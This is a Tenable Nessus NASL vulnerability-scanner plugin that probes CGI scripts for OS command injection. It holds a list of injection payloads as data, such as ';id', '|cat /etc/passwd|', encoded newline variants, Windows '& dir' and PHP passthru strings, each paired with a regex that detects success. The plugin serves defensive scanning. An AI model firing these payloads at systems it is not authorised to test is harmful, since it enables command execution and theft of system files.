#%NASL_MIN_LEVEL 70300
#
# (C) Tenable Network Security, Inc.
#

include('deprecated_nasl_level.inc');
include('compat.inc');

if (description)
{
  script_id(39465);
  script_version("1.40");
  script_set_attribute(attribute:"plugin_modification_date", value:"2022/04/11");

  script_name(english:"CGI Generic Command Execution");

  script_set_attribute(attribute:"synopsis", value:
"Arbitrary code may be run on the remote server.");
  script_set_attribute(attribute:"description", value:
"The remote web server hosts CGI scripts that fail to adequately sanitize
request strings.  By leveraging this issue,  an attacker may be able
to execute arbitrary commands on the remote host.");
  script_set_attribute(attribute:"see_also", value:"https://en.wikipedia.org/wiki/Code_injection");
  script_set_attribute(attribute:"see_also", value:"http://projects.webappsec.org/w/page/13246950/OS%20Commanding");
  script_set_attribute(attribute:"solution", value:
"Restrict access to the vulnerable application. Contact the
vendor for a patch or upgrade to address command execution flaws.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_cwe_id(20, 74, 77, 78, 713, 722, 727, 741, 751, 801, 928, 929);

  script_set_attribute(attribute:"plugin_publication_date", value:"2009/06/19");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"thorough_tests", value:"true");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2009-2022 and is owned by Tenable, Inc. or an Affiliate thereof.");

  script_dependencies("http_version.nasl", "webmirror.nasl", "web_app_test_settings.nasl", "os_fingerprint.nasl", "torture_cgi_load_estimation1.nasl");
  script_require_keys("Settings/enable_web_app_tests");
  script_require_ports("Services/www", 80);
  script_timeout(43200);

  exit(0);
}

include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("torture_cgi.inc");
include("data_protection.inc");

####

i = 0;
flaws_and_patterns = make_array();

unix_flaws = make_array(
"%0Acat%20/etc/passwd",		"RE:root:.*:0:[01]:",
"|cat%20/etc/passwd|",		"RE:root:.*:0:[01]:",

";id",				"RE:uid=[0-9].*gid=[0-9]",
"%3Bid",			"RE:uid=[0-9].*gid=[0-9]",
"|id",				"RE:uid=[0-9].*gid=[0-9]",
"%7Bid",			"RE:uid=[0-9].*gid=[0-9]",
"|/bin/id",			"RE:uid=[0-9].*gid=[0-9]",
"|/usr/bin/id",			"RE:uid=[0-9].*gid=[0-9]",
"|id|",				"RE:uid=[0-9].*gid=[0-9]",

# If special characters are escaped with antislash, but if antislash itself
# is not escaped, then the web app is vulnerable to these attacks:
"\;id",				"RE:uid=[0-9].*gid=[0-9]",
"VALUE\;id",			"RE:uid=[0-9].*gid=[0-9]",

#
"VALUE;/bin/id",		"RE:uid=[0-9].*gid=[0-9]",
"VALUE;/usr/bin/id",		"RE:uid=[0-9].*gid=[0-9]",
"VALUE%0Acat%20/etc/passwd",	"RE:root:.*:0:[01]:"
);

win_flaws = make_array(
"VALUE%20|%20dir",		"ST:<DIR>",
# For ASP - 0x26 -> &
"VALUE%26dir",			"ST:<DIR>"
);

####

port = torture_cgi_init(vul:'EX');

####

if (thorough_tests || get_kb_item("www/"+port+"/PHP"))
{
  foreach k (make_list( "<?php passthru('id'); die; ?>",
  	    		"passthru('id')",
			"VALUE; passthru('id'); die") )
    unix_flaws[k] = "RE:uid=[0-9].*gid=[0-9]";

  foreach k (make_list( "<?php passthru('dir'); die; ?>",
  	    		"passthru('dir')",
			"VALUE; passthru('dir'); die") )
    win_flaws[k] = "ST:<DIR>";
}

if (thorough_tests || experimental_scripts)
{
 # A simple payload is prone to FP if the webapp is vulnerable to XSS:
 # we may found the whole command in the response, not its result.
 # => we use multiple arguments to echo, separated by two spaces
 foreach k (make_list("echo%20NeS%20%20SuS", ";echo%20NeS%20%20SuS"))
   # But we should get only one space in the output!
   flaws_and_patterns[k] = "RE:([^ o]|([^h]o|(([^c]ho|[^e]cho)))) *NeS( |%20)SuS";
 unix_flaws["x%0Acat%20/etc/passwd"] = "RE:root:.*:0:[01]:";
 unix_flaws["%0Aid"] = "RE:uid=[0-9].*gid=[0-9]";
 foreach k (make_list("%26id","VALUE%26id"))
   unix_flaws[k] = "RE:uid=[0-9].*gid=[0-9]";
}

####

unix = 0; win = 0;
if (report_paranoia > 1)
{
  # Even if the web server is based on Unix (for example), it may call a
  # back-end which runs on Windows.
  unix = 1; win = 1;
}
else
{
  os = get_kb_item("Host/OS");
  if (! os)
  {
    debug_print('Unknown OS - enabling all attacks\n');
    unix = 1; win = 1;
  }
  else
  {
    if ("Windows" >< os) win = 1;
    if (egrep(string: os, pattern: "BSD|Linux|Unix|AIX|HP-UX|Mac OS X", icase: 1)) unix = 1;
  }
}

if (! unix && ! win)
{
  debug_print("No attack for OS ", os);
  exit(0, "Will not attack OS "+os);
}

if (unix)
  foreach k (keys(unix_flaws))
    flaws_and_patterns[k] = unix_flaws[k];
if (win)
  foreach k (keys(win_flaws))
    flaws_and_patterns[k] = win_flaws[k];

####

report = torture_cgis(port: port, vul: "EX");

if (strlen(report) > 0)
{
  report = data_protection::sanitize_uid(output:report);
  report = data_protection::redact_etc_passwd(output:report);
  security_hole(port:port, extra: report);
}
